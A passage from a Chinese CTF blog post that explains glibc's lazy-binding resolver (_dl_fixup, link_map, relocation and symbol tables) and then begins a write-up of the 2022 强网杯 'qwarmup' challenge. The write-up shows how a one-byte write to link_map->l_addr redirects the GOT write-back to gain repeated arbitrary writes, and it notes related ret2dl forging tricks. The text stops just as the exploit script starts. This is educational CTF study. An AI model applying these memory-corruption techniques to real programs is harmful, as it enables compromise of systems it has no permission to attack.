    pushq %rbx          # push subtracts stack by 8.
    cfi_adjust_cfa_offset(8)
    cfi_rel_offset(%rbx, 0)
    
    ......
    
    mov %RSP_LP, %RBX_LP
    cfi_def_cfa_register(%rbx)
    and $-STATE_SAVE_ALIGNMENT, %RSP_LP
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 2)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 3)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 4)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 5)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 6)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 7)(%rsp)
    xsavec STATE_SAVE_OFFSET(%rsp)
    mov (LOCAL_STORAGE_AREA + 8)(%BASE), %RSI_LP
    mov LOCAL_STORAGE_AREA(%BASE), %RDI_LP
    call _dl_fixup      # Call resolver.</code></pre>
<p>cfi 开头的指令和函数检测有关，即 GNU Profiler，这里不关心。<code>_dl_runtime_resolvec</code> 函数的这段汇编代码就是保存寄存器的值到栈中，然后调用<code>_dl_fixup</code>执行具体的功能，然后从栈中恢复寄存器。<code>_dl_fixup</code> 函数传入的两个参数一个是<code>rdi</code>寄存器中存储的<code>link_map</code>，<code>rsi</code>是<code>GOT</code> 表中关于 <code>PLT</code> 重定位的索引值[1]，后面要根据该索引值写入新的地址。</p>
<p>这里并不需要过多分析，直接到<code>_dl_fixup</code>才是我们的核心逻辑。</p>
<h3 id="dl_fixup">3. _dl_fixup</h3>
<p>显然<code>_dl_fixup</code>函数的两个参数就是我们压栈压入的参数，<code>link_map</code>的地址和函数索引<code>0x1</code></p>
<p><img src="https://pic.imgdb.cn/item/6373c3bf16f2c2beb10285a7.jpg" /></p>
<p>接下来我们主要对照Glibc源码来看：<a href="https://codebrowser.dev/glibc/glibc/elf/dl-runtime.c.html#39">dl-runtime.c source code - Codebrowser</a></p>
<p>首先是传入的两个参数</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a>_dl_fixup (<span class="kw">struct</span> link_map *l, ElfW(Word) reloc_arg)</span></code></pre></div>
<h4 id="link_map">3.1 link_map</h4>
<p>下面详细介绍一下这个在延迟绑定过程中非常重要的结构体<code>struct link_map *l</code>。</p>
<p><code>link_map</code> 的作用就是记录程序加载的所有共享库的链表, 当需要查找符号时就需要遍历该链表找到对应的共享库.</p>
<p>也就是说，所谓的<code>link_map</code>就是每个动态链接库将有关<code>ELF</code>的所有相关信息包装成一个非常整洁的数据结构。它将使用<code>l_next</code>h和<code>l_prev</code>来连接和定位其他文件的<code>link_map</code>结构体，并提供大量其他所需的信息来进行符号解析。具体的<code>struct link_map</code>内容可以查看源码：<a href="https://codebrowser.dev/glibc/glibc/include/link.h.html#link_map">link.h source code - Codebrowser</a></p>
<p>这里给出一些关键的结构：</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="kw">struct</span> link_map</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a>  {</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a>    ElfW(Addr) l_addr;      <span class="co">/* Difference between the address in the ELF</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a><span class="co">                   file and the addresses in memory.  */</span></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a>    <span class="dt">char</span> *l_name;       <span class="co">/* Absolute file name object was found in.  */</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a>    ElfW(Dyn) *l_ld;        <span class="co">/* Dynamic section of the shared object.  */</span></span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a>    <span class="kw">struct</span> link_map *l_next, *l_prev; <span class="co">/* Chain of loaded objects.  */</span></span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true"></a>    <span class="co">/* All following members are internal to the dynamic linker.</span></span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true"></a><span class="co">       They may change without notice.  */</span></span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true"></a>    <span class="co">/* This is an element which is only ever different from a pointer to</span></span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true"></a><span class="co">       the very same copy of this type for ld.so when it is used in more</span></span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true"></a><span class="co">       than one namespace.  */</span></span>
<span id="cb9-13"><a href="#cb9-13" aria-hidden="true"></a>    <span class="kw">struct</span> link_map *l_real;</span>
<span id="cb9-14"><a href="#cb9-14" aria-hidden="true"></a>    <span class="co">/* Number of the namespace this link map belongs to.  */</span></span>
<span id="cb9-15"><a href="#cb9-15" aria-hidden="true"></a>    Lmid_t l_ns;</span>
<span id="cb9-16"><a href="#cb9-16" aria-hidden="true"></a>    <span class="kw">struct</span> libname_list *l_libname;</span>
<span id="cb9-17"><a href="#cb9-17" aria-hidden="true"></a>    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span>
<span id="cb9-18"><a href="#cb9-18" aria-hidden="true"></a>              + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span>
<span id="cb9-19"><a href="#cb9-19" aria-hidden="true"></a>    <span class="dt">const</span> ElfW(Phdr) *l_phdr;   <span class="co">/* Pointer to program header table in core.  */</span></span>
<span id="cb9-20"><a href="#cb9-20" aria-hidden="true"></a>    </span>
<span id="cb9-21"><a href="#cb9-21" aria-hidden="true"></a>    .......</span>
<span id="cb9-22"><a href="#cb9-22" aria-hidden="true"></a>  };</span></code></pre></div>
<p>比较关键的几个:</p>
<p><code>l_addr</code>: 加载的ELF文件(或者其他.so动态链接文件)地址和内存地址的偏移</p>
<p><code>l_name</code>: 指向加载的ELF文件(或者其他.so动态链接文件)的文件名（一般ELF为0）</p>
<p><code>l_next&amp;l_prev</code>： 字面意思，指向下一个或者上一个<code>link_map</code>结构体</p>
<p><code>l_info[]</code>: <code>l_info</code>数据组，保存了这个<code>link_map</code>对应的ELF文件各个数据节和数据段的地址，本质上是使用这个<code>l_info[]</code>对应的<code>.dynamic</code>节上的众多<code>Elf64_Dyn</code>结构体来实现。</p>
<blockquote>
<p>如果一个目标文件参与到动态链接的过程中，那么它的程序头部表将会包含一个类型为 <code>PT_DYNAMIC</code>的元素。这个段包含了<code>.dynamic</code>节。<code>ELF</code> 使用<code>_DYNAMIC</code> 符号来标记这个节。</p>
</blockquote>
<h4 id="dynamic和elf64_dyn">3.2 .dynamic和Elf64_Dyn</h4>
<p><code>.dynamic</code>节上保存众多<code>Elf64_Dyn</code>结构体。</p>
<p><code>Elf64_Dyn</code>结构体具体结构：</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a>{</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a>    Elf64_Sword d_tag; <span class="co">/* Dynamic entry type */</span></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>    <span class="kw">union</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>    {</span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a>        Elf64_Word d_val; <span class="co">/* Integer value */</span></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a>        Elf64_Addr d_ptr; <span class="co">/* Address value */</span></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a>    } d_un;</span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a>} Elf64_Dyn;</span></code></pre></div>
<p>其中，<code>d_tag</code> 的取值决定了该如何解释 <code>d_un</code>。</p>
<ul>
<li><code>d_val</code>
<ul>
<li>这个字段表示一个整数值，可以有多种意思。</li>
</ul></li>
<li><code>d_ptr</code>
<ul>
<li>这个字段表示程序的虚拟地址。当解析动态节中的地址时，动态链接器会根据原始文件的值以及内存的基地址来计算真正的地址。</li>
</ul></li>
</ul>
<p>可以看出，其实这个节是由若干个键值对构成的。</p>
<p>完整的<code>d_tag</code>何其对应的内容可以看Oracle提供的详细文档： <a href="https://docs.oracle.com/cd/E56344_01/html/E54069/chapter6-42444.html">动态节 - Oracle® Solaris 11.2 链接程序和库指南</a></p>
<p><code>ELF</code>中这个节以及对应的内容可以直接通过<code>IDA pro</code>查看：</p>
<p><img src="https://pic.imgdb.cn/item/6374ec2116f2c2beb175cde7.jpg" /></p>
<p>同理在GDB中我们可以通过查看<code>.dynamic</code>节的位置来定位：</p>
<p><img src="https://pic.imgdb.cn/item/6374e8fb16f2c2beb1716314.jpg" /></p>
<p><img src="https://pic.imgdb.cn/item/6378bee116f2c2beb1453128.jpg" /></p>
<p>下面介绍几个常用的<code>d_tag</code>:</p>
<table>
<thead>
<tr class="header">
<th>d_tag</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>DT_PLTGOT</td>
<td>3</td>
<td>给出与过程链接表或者全局偏移表相关联的地址，对应的段<code>.got.plt</code></td>
</tr>
<tr class="even">
<td>DT_STRTAB</td>
<td>5</td>
<td>此类型表项包含动态字符串表的地址。符号名、库名、和其它字符串都包含在此表中。对应的节的名字应该是<code>. dynstr</code>。</td>
</tr>
<tr class="odd">
<td>DT_SYMTAB</td>
<td>6</td>
<td>此类型表项包含动态符号表<code>.dynsym</code>的地址。这个符号表中的条目的类型为 <code>Elf64_Sym</code>。</td>
</tr>
<tr class="even">
<td>DT_SYMENT</td>
<td>11</td>
<td><code>DT_SYMTAB</code> 符号项的大小（字节）。</td>
</tr>
<tr class="odd">
<td>DT_DEBUG</td>
<td>21</td>
<td>此类型表项用于调试。</td>
</tr>
<tr class="even">
<td>DT_JMPREL</td>
<td>23</td>
<td>该类型的条目的 <code>d_ptr</code>成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。</td>
</tr>
</tbody>
</table>
<blockquote>
<p>注意除了数组末尾的<code>DT_NULL</code> 元素以及<code>DT_NEEDED</code>元素的相对顺序约束以外， 其他表项可以以任意顺序出现。</p>
</blockquote>
<p>这里出现了很多上文没有提到的节和结构体，之后我们在使用它的时候会详细介绍。</p>
<p>总之，现在我们才介绍完了<code>_dl_fixup()</code>的传参，接下来我们正式阅读这个函数的正式内容。</p>
<h4 id="dynsym和elf64_sym">3.3 .dynsym和Elf64_sym</h4>
<p><code>_dl_fixup</code>的开始都是通过<code>l_info[]</code>获取一些参数，我们一行一行来看：</p>
<p><img src="https://pic.imgdb.cn/item/6374f44116f2c2beb187e73c.jpg" /></p>
<p>首先是指针<code>symtab</code></p>
<div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a>  <span class="dt">const</span> ElfW(Sym) *<span class="dt">const</span> symtab</span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a>    = (<span class="dt">const</span> <span class="dt">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span></code></pre></div>
<p>其中<code>D_PTR</code>是个宏定义：</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="pp">#define D_PTR(map, i) \</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a><span class="pp">  ((map)-&gt;i-&gt;d_un.d_ptr + (dl_relocate_ld (map) ? 0 : (map)-&gt;l_add</span></span></code></pre></div>
<p>简单来说就是根据传入的<code>link_map</code>和对应的<code>l_info[d_tag]</code>获取这个<code>d_tag</code>对应的<code>d_un</code>。</p>
<p>根据上文的<code>d_tag</code>表，<code>DT_SYMTAB</code>也就是获得动态符号表<code>.dynsym</code>的地址。</p>
<p><code>.dynsym</code>节也叫<strong>符号表节</strong>，上面保存众多<code>Elf64_Sym</code>结构体。</p>
<p><img src="https://pic.imgdb.cn/item/6374fe2416f2c2beb19f4367.jpg" /></p>
<p><img src="https://pic.imgdb.cn/item/6374fe3016f2c2beb19f8922.jpg" /></p>
<p>显然，一个<code>Elf64_Sym</code>结构体定义如下：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> {</span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a>        Elf64_Word      st_name;</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a>        <span class="dt">unsigned</span> <span class="dt">char</span>   st_info;</span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a>        <span class="dt">unsigned</span> <span class="dt">char</span>   st_other;</span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true"></a>        Elf64_Half      st_shndx;</span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true"></a>        Elf64_Addr      st_value;</span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true"></a>        Elf64_Xword     st_size;</span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true"></a>} Elf64_Sym;</span></code></pre></div>
<p>接下会我们会用到的参数</p>
<ul>
<li><p>st_name 目标文件的<strong>符号字符串表的索引</strong>，其中包含符号名称的字符表示形式。如果该值为非零，则表示指定符号名称的字符串表索引。否则，符号表项没有名称。</p></li>
<li><p>st_value</p>
<p>关联符号的值。根据上下文，该值可以是绝对值或<strong>地址</strong>。</p></li>
<li><p>st_info</p>
<p>符号的类型和绑定属性。</p></li>
</ul>
<p><code>st_name</code>对应了目标文件的<strong>字符串表</strong>的索引，详细的部分会在下文提到。</p>
<p>回头来看，也就是说：</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a>  <span class="dt">const</span> ElfW(Sym) *<span class="dt">const</span> symtab</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a>    = (<span class="dt">const</span> <span class="dt">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span></code></pre></div>
<p>也就是获得<code>.dynsym</code>节（符号表节）的地址，我们在GDB中查看它：</p>
<p><img src="https://pic.imgdb.cn/item/6378be1e16f2c2beb1438f3d.jpg" /></p>
<p>可以看到<code>symtab</code>指针指向了我们的<code>.dynsym</code>节的真实起始地址。</p>
<h4 id="dynstr">3.4 .dynstr</h4>
<p><img src="https://pic.imgdb.cn/item/637502c716f2c2beb1b499a4.jpg" /></p>
<p>接下来这一行可以很清楚的知道，根据<code>d_tag: DT_STRTAB</code>也就是获得我们的<code>.dynstr</code>节的地址，这个节中保存着我们的<strong>字符串表</strong>。</p>
<p><img src="https://pic.imgdb.cn/item/6375033916f2c2beb1b60f9e.jpg" /></p>
<p>也就是保存了每个字符串的表。</p>
<h4 id="rela.plt-和elf64_rela">3.5 .rela.plt 和Elf64_Rela</h4>
<p>接下来两行在一起看</p>
<p><img src="https://pic.imgdb.cn/item/6375047016f2c2beb1b92f4f.jpg" /></p>
<p>先是获得<code>.got.plt</code>节的地址，也就是我们<code>GOT</code>表的真实地址，之后计算了指针<code>reloc</code></p>
<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="dt">const</span> PLTREL *<span class="dt">const</span> reloc</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a>    = (<span class="dt">const</span> <span class="dt">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));</span></code></pre></div>
<p>根据<code>d_tag: DT_JMPREL</code>也就是获得我们的<code>.rela.plt</code>节（<strong>重定位节</strong>）的地址。重定位是连接符号引用与符号定义的过程。</p>
<p>例如，程序调用函数时，关联的调用指令必须在执行时将控制权转移到正确的目标地址。可重定位文件必须包含说明如何修改其节内容的信息。通过此信息，可执行文件和共享目标文件可包含进程的程序映像的正确信息。重定位项即是这些数据。</p>
<p>重定位节中保存了每个外部函数的<code>Elf64_Rela</code>结构体，这些结构体格式如下：</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> {</span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a>        Elf64_Addr      r_offset;</span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true"></a>        Elf64_Xword     r_info;</span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true"></a>        Elf64_Sxword    r_addend;</span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true"></a>} Elf64_Rela;</span></code></pre></div>
<ul>
<li>r_offset</li>
</ul>
<p>此成员指定应用重定位操作的位置。不同的目标文件对于此成员的解释会稍有不同。</p>
<p>对于可重定位文件，该值表示节偏移。重定位节说明如何修改文件中的其他节。重定位偏移会在第二节中指定一个存储单元。</p>
<p>对于可执行文件或共享目标文件，该值表示受重定位影响的存储单元的虚拟地址。此信息使重定位项对于运行时链接程序更为有用。</p>
<ul>
<li>r_info</li>
</ul>
<p>此成员指定必须对其进行重定位的符号表索引以及要应用的重定位类型。</p>
<p>完整内容可以参考：<a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-54839.html#chapter7-2">重定位节 - 链接程序和库指南 (oracle.com)</a></p>
<p><strong>其中 (r_info &gt;&gt; 32)为这个重定位结构体对应的函数在符号表中的索引</strong></p>
<p>听起来比较抽象，下面我们在GDB中实际看一下：</p>
<p>首先<code>pltgot</code>就是我们的<code>GOT</code>表地址</p>
<p><img src="https://pic.imgdb.cn/item/6375087316f2c2beb1c570f8.jpg" /></p>
<p>而我们的重定位节内容为：</p>
<p><img src="https://pic.imgdb.cn/item/6375097716f2c2beb1cd46ec.jpg" /></p>
<p>实际内存中也就是：</p>
<p><img src="https://pic.imgdb.cn/item/6378be3916f2c2beb143ba00.jpg" /></p>
<p>通过<code>IDA</code>可以看出0x648处的<code>Elf64_Rela</code>才是对应<code>write</code>的重定位结构体，也就是</p>
<p><img src="https://pic.imgdb.cn/item/637509ab16f2c2beb1cf3f34.jpg" /></p>
<div class="sourceCode" id="cb17"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a>  r_offset = <span class="bn">0x4020</span>,</span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a>  r_info = <span class="bn">0x400000007</span>,</span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true"></a>  r_addend = <span class="dv">0</span></span></code></pre></div>
<p>显然<code>r_offset = 0x4020</code>正好对应了<code>write</code>函数在<code>GOT</code>表中的偏移：</p>
<p><img src="https://pic.imgdb.cn/item/63750a5016f2c2beb1d3d670.jpg" /></p>
<p>而<code>r_info = 0x400000007</code>中，<code>(r_info &gt;&gt; 32) == 4</code>代表了<code>write</code>函数在<code>GOT</code>表中的索引就是4，也就是说<code>write</code>位于<code>GOT[4]</code>。</p>
<p>最后一部分</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a>reloc_offset(pltgot, reloc_arg);</span></code></pre></div>
<p>就是根据传入的参数<code>reloc_arg</code>获取获取他在<code>GOT</code>表中的索引。所以最后就会根据这个传入的参数得到这个对应函数的重定位表<code>Elf64_Rela</code>地址<code>reloc</code></p>
<p><img src="https://pic.imgdb.cn/item/63750b9716f2c2beb1debe24.jpg" /></p>
<h4 id="rel_addr">3.6 rel_addr</h4>
<p>之后下一部分：</p>
<p><img src="https://pic.imgdb.cn/item/63750bee16f2c2beb1e18421.jpg" /></p>
<p><code>symtab</code>上文提到了，是我们的动态符号表地址，位于<code>.dynsym</code>。</p>
<p>显然，<code>&amp;symtab[ELFW(R_SYM)(reloc-&gt;r_info)]</code>就是获得<code>reloc</code>对应函数的。</p>
<p>对于我们的<code>write</code>函数来说，就是<code>&amp;symtab[0x400000007 &gt;&gt; 32]</code>，也就是<code>&amp;symtab[4]</code>。</p>
<p><img src="https://pic.imgdb.cn/item/6378be5116f2c2beb143df45.jpg" /></p>
<p>之后就到了关键的<code>rel_addr</code>，</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a> <span class="dt">void</span> *<span class="dt">const</span> rel_addr = (<span class="dt">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span></code></pre></div>
<p><code>l-&gt;l_addr</code>上文介绍<code>link_map</code>提过，就是对应ELF的真实地址，而<code>reloc-&gt;r_offset</code>就是对应函数的<code>GOT</code>表的偏移，所以<code>rel_addr</code>就是对应函数在<code>GOT</code>表中的地址，也就是所谓的<strong>写回地址</strong>。</p>
<p><img src="https://pic.imgdb.cn/item/6378be5f16f2c2beb143f756.jpg" /></p>
<p>也就是说，延迟绑定找到函数真实地址之后，就会把他写回这个地址，由于<code>l-&gt;l_addr</code>是保存在<code>ld</code>中写是可写的，伪造<code>l-&gt;l_addr</code>其实就是一种常见的<code>ret2dl</code>技巧。</p>
<h4 id="dl_lookup_symbol_x">3.7 dl_lookup_symbol_x</h4>
<p>跳过中间各种各样的检查，下一个关键部分在<code>_dl_lookup_symbol_x</code>，也就是真正开始查找真实地址的操作。</p>
<p><img src="https://pic.imgdb.cn/item/6378befc16f2c2beb1455c52.jpg" /></p>
<p>传入的第一个参数：</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a>strtab + sym-&gt;st_name</span></code></pre></div>
<p>也就是<code>字符串表基地址+要查找的函数的函数名的偏移</code>，对于我们的<code>write</code>来说:</p>
<p><img src="https://pic.imgdb.cn/item/637511c916f2c2beb10943f0.jpg" /></p>
<p>之后根据这个传入的函数名字符串再进入<code>libc</code>中查找，具体的查找过程我们这里并不深入，需要知道的是，这个查找本质上是遍历哈希表，如果没有找到就根据<code>l-&gt;next</code>定位到下一个文件的<code>link_map</code>重复操作。</p>
<p>同样的，如果我们能伪造<code>strtab</code>的值，我们就可以控制整个<strong>字符串表</strong>，也就可以劫持它查找真实函数地址的过程，这也是在<code>ret2dl</code>中常见的技巧。</p>
<p>这个函数的返回值<code>result</code> 是找到需要的函数的<code>link_map</code>结构体。再这里来说就是找到的<code>write</code>对应的动态链接库<code>libc.so.6</code></p>
<p><img src="https://pic.imgdb.cn/item/6378be7616f2c2beb1441ee1.jpg" /></p>
<h4 id="dl_fixup_make_value-以及后续">3.8 DL_FIXUP_MAKE_VALUE 以及后续</h4>
<p>找到了对应的<code>link_map</code>之后，就是具体查找真实地址，同样的的具体过程这里不详细介绍。</p>
<p><img src="https://pic.imgdb.cn/item/637513f316f2c2beb1185dce.jpg" /></p>
<p>简单来说就是通过获取<code>st_value</code>,来得到函数在外部库里的偏移，并加上外部库的<code>l_addr</code>获得真实地址。</p>
<p>它的返回值<code>value</code>就是在动态链接库中找到的真实地址</p>
<p><img src="https://pic.imgdb.cn/item/6375149316f2c2beb1194a98.jpg" /></p>
<p>之后就会<strong>调用这个外部函数</strong>，并把真实地址写回<code>rel_addr</code>也就是我们的<code>GOT</code>表。</p>
<p><img src="https://pic.imgdb.cn/item/6375158f16f2c2beb11a890d.jpg" /></p>
<p>至此就完成了<code>write</code>函数完整的动态连接过程。</p>
<h3 id="总结">4. 总结</h3>
<p>简单来说，完整的动态链接就是从传入的 <code>reloc_arg</code> 开始，链接器会通过该值找到对应函数的 <code>Elf64_Rela</code> 结构，通过该结构的<code>r_info</code> 变量中的偏移量找到对应函数的 <code>Elf64_Sym</code> 结构，然后再通过 <code>Elf64_Sym</code>结构的<code>st_name</code> 结合之前已经确定的 <code>.dynstr</code> 地址，通过 <code>st_name + .dynstr</code> 获得对应函数的函数名，并根据函数名遍历查找所有的<code>link_map</code>链，直到获取函数所在的<code>link_map</code>并计算<code>st_value + l_addr</code>得到真实地址，之后调用该函数并写回<code>ELF</code>中的<code>GOT</code>表。</p>
<h2 id="x02-强网杯2022-qwarmup">0x02 强网杯2022 qwarmup</h2>
<h3 id="分析">1. 分析</h3>
<p>今年强网杯qwarmup就是明显的延迟绑定<code>rtld</code>的利用，在拿不到具体<code>ALSR</code>地址的情况下可以任意堆偏移写1个字节。</p>
<p><img src="https://pic.imgdb.cn/item/6375e59116f2c2beb10658df.jpg" /></p>
<p>如果我们申请一个较大的<code>chunk</code>，那么返回值的就是利用<code>mmap</code>申请出来的一段相对于<code>libc</code>偏移固定的空间，实现任意写<code>libc</code>。</p>
<h3 id="实现多次任意地址写">2. 实现多次任意地址写</h3>
<p>我们不能真的只用这任意地址写1字节实现攻击，观察分析 <code>do while</code>循环条件，不难知道只要我们输入的<code>size</code>的高位<code>HIWORD</code>为0就可以无限循环，但是这种<code>malloc(size)</code>中size不我们都会考虑申请更大的<code>chunk</code>实现获得一个相对于<code>libc</code>和<code>ld</code>相对地址偏移固定的地址就会导致高位不然不是0，也就是说我们只能写一次程序就会退出结束。</p>
<p>所以我们的第一个目标就是利用任意一字节写修改<code>.bss</code>段上的size的高位。</p>
<p>在上文中，我们介绍了<code>rel_addr</code>也就是写回地址，它的计算方式是:</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a> <span class="dt">void</span> *<span class="dt">const</span> rel_addr = (<span class="dt">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span></code></pre></div>
<p>这个所谓的写回地址就是最终获得函数在动态链接库中的真实地址之后，写回<code>ELF</code>文件中的<code>GOT</code>表的地址，而总所周知，<code>GOT</code>表同样位于我们的<code>.bss</code>段上，且相对于我们的一些全局变量的地址相差很小。所以如果我们能控制写回地址<code>rel_addr</code>就可以实现把真实地址写道bss段上其他地址，从而利用真实地址的高位0覆盖我们要覆盖的size的高位。</p>
<p>首先我们观察下，如果我们输入的<code>size=0xF0000</code>，那么在调用<code>write@plt</code>之前，他们在bss段上的情况：</p>
<p><img src="https://pic.imgdb.cn/item/6375e8a916f2c2beb10cc234.jpg" /></p>
<p>可以看到偏移只有<code>0x08c-0x018 = 0x74</code>，考虑到要让<code>write</code>真实地址的高位0覆盖这个<code>0xF</code>，所以我们只要控制偏移<code>+0x70</code>就可以实现无限循环，也就是从1字节写变成无限字节写。那么接下来就要考虑如何实现修改<code>rel_addr</code>。</p>
<p>对于一个函数的延迟绑定来说，<code>reloc-&gt;r_offset</code>总是固定的，毕竟只有1字节写的情况下我们无法实现伪造相关表和结构体。</p>
<p>所以我们的目标就变成了<code>l-&gt;l_addr</code>。上文提到了<code>link_map *l-&gt;l_addr</code>是加载的ELF文件(或者其他.so动态链接文件)地址和内存地址的偏移。直白来说，<code>ELF</code>中的<code>link_map *l-&gt;l_addr</code>就是保存着这个<code>ELF</code>文件的基地址（虚拟地址）。</p>
<p>定位到<code>_dl_fixup</code>的地址个参数就是<code>link_map *l</code>结构体，这个结构体的第一个参数就是<code>l_addr: 0x563d87dea000</code></p>
<p><img src="https://pic.imgdb.cn/item/6375ead016f2c2beb1110803.jpg" /></p>
<p>也就是我们的<code>ELF</code>基地址：</p>
<p><img src="https://pic.imgdb.cn/item/6375eb3216f2c2beb111d17e.jpg" /></p>
<p>而且<code>l_addr</code>最为基地址，一般低3位都是0，<code>link_map</code>保存在<code>ld</code>中，且可以修改，所以我们在第一次<code>write</code>的延迟绑定之前利用任意字节写修改<code>l_addr</code>的地位为<code>\x70</code>（上文我们算出的偏移），修改写回地址覆盖bss上的size高位为0就可以进入无限循环。</p>
<p>而且由于<code>write</code>的真实地址并没有被写入<code>GOT</code>表，所以之后每次调用<code>write</code>都会触发一次延迟绑定，方便后续调用。</p>
<p>具体在代码注释中：</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a><span class="kw">class</span> link_map:</span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a>    DT_JMPREL <span class="op">=</span> <span class="dv">23</span></span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true"></a>    DT_SYMTAB <span class="op">=</span> <span class="dv">6</span></span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true"></a>    DT_STRTAB <span class="op">=</span> <span class="dv">5</span></span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true"></a>    DT_VER <span class="op">=</span> <span class="dv">50</span></span>
<span id="cb22-6"><a href="#cb22-6" aria-hidden="true"></a>    DT_FINI <span class="op">=</span> <span class="dv">13</span></span>
<span id="cb22-7"><a href="#cb22-7" aria-hidden="true"></a>    DT_PLTGOT <span class="op">=</span> <span class="dv">3</span></span>
<span id="cb22-8"><a href="#cb22-8" aria-hidden="true"></a>    DT_FINI_ARRAY <span class="op">=</span> <span class="dv">26</span></span>
<span id="cb22-9"><a href="#cb22-9" aria-hidden="true"></a>    DT_FINI_ARRAYSZ <span class="op">=</span> <span class="dv">28</span></span>
<span id="cb22-10"><a href="#cb22-10" aria-hidden="true"></a>    DT_DEBUG <span class="op">=</span> <span class="dv">21</span></span>
<span id="cb22-11"><a href="#cb22-11" aria-hidden="true"></a></span>
